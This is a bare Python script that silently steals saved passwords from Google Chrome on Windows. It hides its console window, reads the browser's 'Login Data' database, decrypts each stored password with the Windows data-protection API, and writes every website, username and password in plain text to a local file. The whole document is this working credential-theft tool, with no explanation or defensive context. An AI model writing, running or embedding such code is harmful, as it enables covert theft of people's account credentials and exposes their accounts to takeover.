#!/usr/bin/env python
from os import getenv
import sqlite3
import win32crypt
import os
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
connection = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")
connection.execute('Select action_url, username_value, password_value FROM logins')

f = open("Chromepass.txt", "a+")
f.write("Chrome Saved Passwords\n")

for result in connection.fetchall():

    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]

    if password:

        f.write('\nWebsite: '+result[0])
        f.write('\nUsername: '+result[1])
        f.write('\nPassword: ' + str(password))


